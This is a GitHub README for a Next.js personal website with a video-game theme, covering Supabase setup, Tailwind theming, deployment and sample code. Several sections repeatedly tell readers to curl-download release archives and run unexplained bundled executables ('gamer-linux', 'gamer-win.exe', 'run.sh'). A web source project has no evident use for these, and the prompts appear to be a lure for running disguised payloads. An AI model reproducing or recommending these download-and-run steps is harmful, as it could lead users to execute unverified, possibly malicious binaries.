# Gamer — Next.js Personal Website with Video Game Theme 🎮

[![Releases](https://img.shields.io/badge/Releases-v1.0-blue?logo=github)](https://github.com/AtoLtoEXANDER/Gamer/releases)

[![Next.js](https://img.shields.io/badge/Next.js-13-black?logo=next.js)](https://nextjs.org)
[![React](https://img.shields.io/badge/React-18-61DAFB?logo=react&logoColor=white)](https://reactjs.org)
[![Supabase](https://img.shields.io/badge/Supabase-DB-3ECF8E?logo=supabase&logoColor=white)](https://supabase.com)
[![Tailwind CSS](https://img.shields.io/badge/TailwindCSS-Utility-blue?logo=tailwindcss&logoColor=white)](https://tailwindcss.com)
[![Topic: blog](https://img.shields.io/badge/Topic-blog-green)](https://github.com/topics/blog)
[![License: MIT](https://img.shields.io/badge/License-MIT-green)](./LICENSE)

![Hero image - game controller](https://images.unsplash.com/photo-1511512578047-dfb367046420?q=80&w=1400&auto=format&fit=crop&ixlib=rb-4.0.3&s=2f7f3b32f4fa6b85a0a27a3b0d1d3d32)

Table of contents
- About
- Demo and Screenshots
- Key features
- Tech stack
- Project structure
- Getting started
  - Prerequisites
  - Clone and install
  - Run the site (development)
  - Build and run production
- Releases and executable assets
- Data and CMS: Supabase setup
- Styling: Tailwind CSS and theming
- Content: Posts, pages, and media
- Routing and SEO
- Asset management and optimization
- Accessibility and performance
- Deployment
- CI / CD suggestions
- Testing and QA
- Contributing
- Code of conduct
- License
- Credits and resources
- Changelog

About
This repo hosts a compact personal website built with Next.js. It uses a video game theme across layout, colors, and assets. The site uses React components, Tailwind CSS for styling, and Supabase for authoring and content storage. It targets developers and content creators who want a simple blog and portfolio with a distinct game-flavored UI.

Demo and Screenshots
Hero screenshot
![Landing page - pixel art and neon](https://images.unsplash.com/photo-1542751371-adc38448a05e?q=80&w=1400&auto=format&fit=crop&ixlib=rb-4.0.3&s=5d7e3a9d5b8b9a2a4d9f2f1a0f6c3a1a)

Article page
![Article page - code block and highlighted text](https://images.unsplash.com/photo-1515879218367-8466d910aaa4?q=80&w=1400&auto=format&fit=crop&ixlib=rb-4.0.3&s=ebf4b61b3b9d3f7d5e6a6f1b2e0f5f6a)

Admin / Editor
![Editor screenshot - markdown editor view](https://images.unsplash.com/photo-1519389950473-47ba0277781c?q=80&w=1400&auto=format&fit=crop&ixlib=rb-4.0.3&s=6e8f1aaf7c3b4a1d7c7ef7c9e2b5f1a1)

Key features
- Minimal, fast Next.js frontend with server-side rendering.
- Blog system with Markdown support and MDX rendering.
- Supabase backend for posts, users, and comments.
- Tailwind CSS with a modular design system and dark mode.
- Responsive layout for mobile, tablet, and desktop.
- SEO-ready pages and sitemap generation.
- Image optimization with next/image.
- Code highlighting with Prism or Shiki.
- RSS feed and structured data for better discoverability.
- Basic search via Supabase full-text search or client-side index.
- Simple theme tokens and utilities for game-style UI: neon, pixel fonts, HUD elements.

Tech stack
- Next.js — rendering, routing, image optimization, and API routes.
- React — components and hooks.
- Supabase — hosted Postgres, auth, and storage.
- Tailwind CSS — utility-first styling and theming.
- MDX — mix Markdown with React components.
- Prism/Shiki — code syntax highlighting.
- Vercel, Netlify, or a VPS for deployment.
- Node.js and npm/yarn/pnpm for package management.

Project structure
This is a suggested structure. The repo may vary slightly.

- /app or /pages — Next.js pages or app router files
- /components — UI components (Header, Footer, Card, Post, Player)
- /layouts — page layout wrappers
- /styles — Tailwind config and global CSS
- /lib — helper utilities (supabase client, markdown parser)
- /data — example content or seeds
- /public — static assets (images, fonts, favicon)
- /scripts — setup scripts and helpers
- /tests — unit and integration tests
- /README.md — this document
- /package.json — scripts and dependencies

Getting started

Prerequisites
- Node.js 18+ or the LTS version recommended by Next.js.
- npm, yarn, or pnpm to manage packages.
- A Supabase project (for full site features).
- Git to clone the repository.

Clone and install
1. Clone the repository:
```bash
git clone https://github.com/AtoLtoEXANDER/Gamer.git
cd Gamer
```

2. Install dependencies with your package manager:
```bash
# npm
npm ci

# yarn
yarn install

# pnpm
pnpm install
```

3. Copy example env file and update values:
```bash
cp .env.example .env.local
```
Open .env.local and set:
- NEXT_PUBLIC_SUPABASE_URL
- NEXT_PUBLIC_SUPABASE_ANON_KEY
- NEXT_PUBLIC_SITE_URL
- NEXT_PUBLIC_GOOGLE_ANALYTICS (optional)
- Any other keys used by the app

Run the site (development)
Start the dev server:
```bash
npm run dev
# or
yarn dev
# or
pnpm dev
```
Open http://localhost:3000 to preview. The site supports hot reload. Edit components, pages, and styles and refresh to see changes.

Build and run production
1. Build:
```bash
npm run build
```
2. Start production server:
```bash
npm run start
```
The production server runs the optimized Next.js build. For static export use next export if configured.

Releases and executable assets
This repository posts packaged releases. Download the release package and execute the included file or start script to run the packaged version locally or on a server. The releases page contains build artifacts and installer-like bundles.

- Visit the releases page or use the badge above:
  https://github.com/AtoLtoEXANDER/Gamer/releases

If the releases page contains an archive (.zip or .tar.gz), use these steps:

Linux / macOS (tar.gz)
```bash
curl -L -o gamer-release.tar.gz "https://github.com/AtoLtoEXANDER/Gamer/releases/download/v1.0/gamer-v1.0.tar.gz"
tar -xzf gamer-release.tar.gz
cd gamer-v1.0
# if the release contains a node app
npm ci
npm run start
# or execute a binary, for example:
chmod +x gamer-linux
./gamer-linux
```

Windows (.zip)
1. Download gamer-v1.0.zip from the releases page.
2. Extract the archive.
3. Open PowerShell in the extracted folder and run:
```powershell
npm ci
npm run start
# or
.\gamer-win.exe
```

If the release has a single executable, mark it executable (Unix) and run it. If the release bundles a Docker image or docker-compose file, run the provided Docker commands. If the release link fails or the page does not show clear assets, check the Releases section inside the repository on GitHub.

If the link does not work for you, check the Releases tab on GitHub for the latest assets:
https://github.com/AtoLtoEXANDER/Gamer/releases

Data and CMS: Supabase setup
The site uses Supabase for data and file storage. The repo ships with a lib/supabase client and simple schema SQL you can import.

Supabase setup steps
1. Create a Supabase project at https://app.supabase.com.
2. Create a table for posts:
- id (uuid, primary key, default gen_random_uuid())
- title (text)
- slug (text, unique)
- content (text)
- excerpt (text)
- published (boolean)
- published_at (timestamp)
- tags (text[] or jsonb)
- author_id (uuid)
- cover_url (text)
- created_at (timestamp with timezone)
3. Create a table for authors:
- id (uuid, primary key)
- name (text)
- bio (text)
- avatar_url (text)
- created_at
4. Create policies for public read on posts and specific insert/update only for authenticated users or service role.
5. Enable Storage for images and set a public bucket for covers and media.

Supabase client configuration
Place Supabase keys in .env.local:
```
NEXT_PUBLIC_SUPABASE_URL=https://xyz.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=public-anon-key
SUPABASE_SERVICE_ROLE_KEY=your-service-role-key
```
Use the public key on the client. Use the service role key on server-only functions or server components that require elevated access.

Markdown and MDX
- The site uses MDX to allow inline React components inside posts.
- Use frontmatter for post metadata (title, date, tags, cover).
- The build process converts MDX to static props or server-rendered content.

Styling: Tailwind CSS and theming
Tailwind drives the design. The repo uses a theme file with custom colors and tokens to create a game-like look: neon, HUD panels, scanlines, and a pixel font fallback.

Key Tailwind items
- tailwind.config.js contains custom colors like neon-blue, neon-pink, gray-hud, and a dark background.
- Utility classes manage spacing, responsive behavior, and typography.
- CSS variables live in :root to support dynamic theme toggles.

Dark mode
- The site uses class-based dark mode. The header includes a toggle that updates local storage and adds the .dark class to html.
- Tailwind config uses darkMode: 'class'.

Fonts and pixel look
- Use a pixel font for headings (e.g., Press Start 2P) and a clean sans for body copy.
- Load fonts via Google Fonts or a local font in /public/fonts.

Animations and micro-interactions
- Use small CSS transforms and transitions for buttons and links.
- Use a subtle neon glow on active elements.
- Use CSS sprite or SVG for HUD icons.

Content: Posts, pages, and media
Post format
- Use MDX with frontmatter:
```md
---
title: "How I Tuned an Emulator"
date: "2024-06-10"
tags: ["emulation", "retro", "setup"]
excerpt: "A short guide on emulator performance and shaders."
cover: "/posts/emulator-cover.png"
---
```
- Export a default function or plain MDX content.

Media handling
- Place images in the public folder or in Supabase Storage.
- Serve images with next/image for optimization and lazy loading.
- For user uploads, use Supabase Storage signed URLs.

Authoring workflow
- Create posts locally and push to Git, or use a simple admin UI tied to Supabase to create posts that the site pulls at runtime.
- For a git-based workflow, the repo supports static generation and commit-based publishing.

Routing and SEO
Routing
- Use file-based routing in Next.js: pages/posts/[slug].tsx or app/posts/[slug]/page.tsx.
- Add catch-all routes for nested content if needed.

SEO
- Each page sets metadata: title, description, canonical link, and open graph tags.
- Use structured data (JSON-LD) for articles to improve SERP display.
- Provide an RSS feed at /rss.xml generated at build time.

Sitemap
- Generate sitemap.xml at build and serve it from the public folder or an API route that regenerates.

Asset management and optimization
Images
- Use next/image to optimize sizes.
- Provide an image loader or use Next.js built-in loader if deployed to Vercel.

Fonts
- Use font-display: swap to avoid layout shifts.

Code blocks
- Use Prism or Shiki for server-side highlighting to avoid runtime hits.
- Compress large vendor libraries and use dynamic imports where appropriate.

Accessibility and performance
Accessibility
- Maintain semantic HTML: headings, landmarks, and native controls.
- Add ARIA attributes where native tags cannot convey intent.
- Ensure color contrast in neon themes by tuning background and glow layers.
- Support keyboard navigation for interactive elements.

Performance
- Use server-side rendering or incremental static regeneration for posts.
- Avoid heavy client-side JS on landing pages.
- Use caching headers and image optimization.
- Run Lighthouse audits and act on flagged issues.

Deployment
Deploy to Vercel for a seamless Next.js experience. You can also deploy to Netlify or other hosts as long as Next.js server support exists.

Vercel
- Connect the repo to Vercel.
- Add environment variables in the Vercel dashboard: NEXT_PUBLIC_SUPABASE_URL, NEXT_PUBLIC_SUPABASE_ANON_KEY, etc.
- Set build command: npm run build
- Set output directory per Next.js defaults.

Docker (optional)
Example Dockerfile to run a Node server:
```dockerfile
FROM node:18-alpine AS deps
WORKDIR /app
COPY package.json package-lock.json ./
RUN npm ci --production

FROM node:18-alpine AS builder
WORKDIR /app
COPY . .
RUN npm ci
RUN npm run build

FROM node:18-alpine AS runner
WORKDIR /app
ENV NODE_ENV=production
COPY --from=builder /app/.next ./.next
COPY --from=builder /app/public ./public
COPY --from=builder /app/node_modules ./node_modules
COPY --from=builder /app/package.json ./package.json
CMD ["node", "server.js"]
```
Adjust the Dockerfile to your hosting model. If you build a static export, serve it with a lightweight static server.

CI / CD suggestions
- Use GitHub Actions to run tests, lint, and deploy.
- Basic workflow:
  - On push to main: run tests, run build, and deploy to Vercel or build and publish a Docker image to a registry.
- Example jobs:
  - lint: static analysis with ESLint and Stylelint.
  - test: unit tests with Jest or Vitest.
  - build: Next.js build and artifact upload.
  - release: create a GitHub release and attach build artifacts.

Testing and QA
Unit tests
- Test components with Jest and React Testing Library.
- Mock Supabase client with a local stub or msw.

Integration tests
- Use Playwright or Cypress for end-to-end tests.
- Test routing, form submissions, and editor flows.

Performance checks
- Run Lighthouse in CI using the Lighthouse CI or a GitHub Action.
- Fail builds that exceed a threshold for performance or accessibility.

Contributing
- Fork the repo.
- Create a feature branch: git checkout -b feat/your-feature
- Make changes and write tests.
- Open a pull request.
- Keep commits small and focused.
- Follow the project's code style and lint rules.

Pull request checklist
- The PR includes a clear description of changes.
- The code compiles and passes lint.
- Tests pass locally.
- UI changes include screenshots.
- Add documentation for new features.

Issue tracking
- Open issues for bugs and feature requests.
- Tag issues with labels: bug, enhancement, discussion.

Code of conduct
Be respectful. The project aims to remain friendly and inclusive. Report any issues via the repo's issue tracker.

License
This project uses the MIT license. See LICENSE for details.

Credits and resources
Design and art assets
- Hero and mock images: Unsplash (links in this README for previews).
- Pixel fonts: Google Fonts or local license files.
- Icons: Heroicons or Font Awesome under respective licenses.

Libraries and tools
- Next.js — documentation and optimization guides.
- Tailwind CSS — theming and plugin docs.
- Supabase — auth and storage guides.
- MDX — docs for mixing React in Markdown.
- Prism/Shiki — code highlighting resources.

External tutorials and references
- Next.js blog patterns
- Tailwind CSS best practices
- Supabase quickstart and SQL snippets

Changelog
Keep a changelog for releases. Use the Releases page for packaged builds and release notes:
https://github.com/AtoLtoEXANDER/Gamer/releases

When you download a release asset, it will typically include a README or run script inside. Execute the provided script or binary. If the release uses a Docker image, follow the included docker run commands. If the link fails or you cannot find assets, check the Releases page on GitHub.

Common commands reference
- Start dev server:
```bash
npm run dev
```
- Build:
```bash
npm run build
```
- Start production:
```bash
npm run start
```
- Lint:
```bash
npm run lint
```
- Test:
```bash
npm run test
```

Example MDX post component
```jsx
import Image from 'next/image'
import { format } from 'date-fns'

export default function Post({ meta, children }) {
  return (
    <article className="prose lg:prose-xl mx-auto p-4">
      <h1>{meta.title}</h1>
      <p className="text-sm text-muted-foreground">
        {format(new Date(meta.date), 'MMMM d, yyyy')}
      </p>
      {meta.cover && (
        <Image src={meta.cover} alt={`${meta.title} cover`} width={1200} height={600} />
      )}
      <div>{children}</div>
    </article>
  )
}
```

Example Supabase helper
```js
import { createClient } from '@supabase/supabase-js'

const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL
const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY

export const supabase = createClient(supabaseUrl, supabaseAnonKey)
```

Design tokens example (tailwind.config.js snippet)
```js
module.exports = {
  theme: {
    extend: {
      colors: {
        'neon-blue': '#00d9ff',
        'neon-pink': '#ff2d95',
        'hud-gray': '#0f1724',
        'panel': '#0b1220'
      },
      fontFamily: {
        heading: ['"Press Start 2P"', 'ui-sans-serif'],
        body: ['Inter', 'ui-sans-serif']
      }
    }
  }
}
```

Tips for authors and maintainers
- Keep posts short and focused. Use readable paragraphs.
- Use frontmatter tags to enable curated lists and tag pages.
- Use lazy loading on non-critical components.
- Keep third-party scripts limited to essentials.

Commands to download and execute a release (recap)
Because this repo's releases page contains a path, download the release file and execute it. Use curl or your browser to download. For archives, extract and run included scripts. For single executables, set execute permission and run.

Example Linux steps:
```bash
# Download (adjust filename per release)
curl -L -o gamer-v1.0.tar.gz "https://github.com/AtoLtoEXANDER/Gamer/releases/download/v1.0/gamer-v1.0.tar.gz"
tar -xzf gamer-v1.0.tar.gz
cd gamer-v1.0
# Run included start script or binary
chmod +x run.sh
./run.sh
# or if binary
chmod +x gamer-linux
./gamer-linux
```

If you cannot find a packaged file, visit the Releases page:
https://github.com/AtoLtoEXANDER/Gamer/releases

Maintenance checklist
- Update dependencies monthly.
- Rotate Supabase keys if you suspect exposure.
- Run Lighthouse periodically.
- Update fonts if licensing changes.
- Renew any paid assets.

Support
Open issues on GitHub. Provide logs and reproduction steps. Use clear titles and smallest reproducible cases.

This README lists steps and examples you can follow to run, extend, and maintain the Gamer site. For binary or packaged releases, download the asset from the Releases page and run the included file. If the link does not work, check the Releases tab on GitHub for the latest assets and instructions.